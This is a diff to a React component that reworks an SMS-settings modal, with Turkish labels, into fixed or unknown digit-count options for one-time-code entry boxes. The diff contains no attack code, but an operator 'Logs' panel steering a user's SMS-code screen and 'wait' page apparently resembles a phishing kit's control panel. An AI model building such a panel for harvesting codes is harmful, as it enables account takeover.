@@ -2141,11 +2141,41 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
           <div className={`w-full max-w-md rounded-2xl border p-6 shadow-2xl ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
             <h3 className={`text-lg font-bold mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMS Ayarları</h3>
-            
-            <div className="space-y-4">
-              {/* ⭐ BELİRSİZ HANE YENİ SEÇENEK */}
+
+            <div className="space-y-3">
+              {/* ⭐ 1) SABİT HANE (Seçenek 1 - Radyo) */}
               <div
-                onClick={() => setSmsModeUnknown((v) => !v)}
+                onClick={() => setSmsModeUnknown(false)}
+                className={`flex cursor-pointer items-start gap-3 rounded-xl border p-3 transition-all ${
+                  !smsModeUnknown
+                    ? darkMode
+                      ? "border-[#16A34A] bg-[#16A34A]/8"
+                      : "border-[#16A34A] bg-[#16A34A]/8"
+                    : darkMode
+                      ? "border-zinc-800 bg-zinc-900/40 hover:border-zinc-700"
+                      : "border-gray-200 bg-gray-50/60 hover:border-gray-300"
+                }`}
+              >
+                <div
+                  className={`mt-0.5 flex size-5 shrink-0 items-center justify-center rounded-full border-2 transition-all ${
+                    !smsModeUnknown ? "border-[#16A34A] bg-[#16A34A]" : darkMode ? "border-zinc-600" : "border-gray-400"
+                  }`}
+                >
+                  {!smsModeUnknown && <div className="size-2.5 rounded-full bg-white" />}
+                </div>
+                <div className="min-w-0 flex-1">
+                  <div className={`text-sm font-bold ${darkMode ? "text-white" : "text-gray-900"}`}>
+                    Sabit Hane
+                  </div>
+                  <div className={`mt-0.5 text-[11px] ${darkMode ? "text-zinc-400" : "text-gray-500"}`}>
+                    Belirlediğiniz hane sayısı (4-12) kadar sabit sayıda kutu gösterilir. Örn 6 haneli SMS.
+                  </div>
+                </div>
+              </div>
+
+              {/* ⭐ 2) BELİRSİZ HANE (Seçenek 2 - Radyo) */}
+              <div
+                onClick={() => setSmsModeUnknown(true)}
                 className={`flex cursor-pointer items-start gap-3 rounded-xl border p-3 transition-all ${
                   smsModeUnknown
                     ? darkMode
@@ -2168,7 +2198,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     Belirsiz Hane
                   </div>
                   <div className={`mt-0.5 text-[11px] ${darkMode ? "text-zinc-400" : "text-gray-500"}`}>
-                    Kullanıcı kaç haneli kod girerse (minimum 4 hane) otomatik o kadar kutu oluşur. 4+ hane DOLUNCA otomatik onaylanır ve wait sayfasına geçer.
+                    Kaç haneli kod geldiğini bilmiyorsanız. Kullanıcı 4. haneyi girene kadar 4 kutu, sonraki her hane için YENİ kutu açılır (max 12). Kullanıcı Devam butonuna basınca ilerler.
                   </div>
                 </div>
               </div>
@@ -2182,7 +2212,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     max={12}
                     value={smsDigitsInput}
                     onChange={(e) => setSmsDigitsInput(e.target.value)}
-                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#16A34A]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#16A34A]'}`}
                   />
                 </div>
               )}
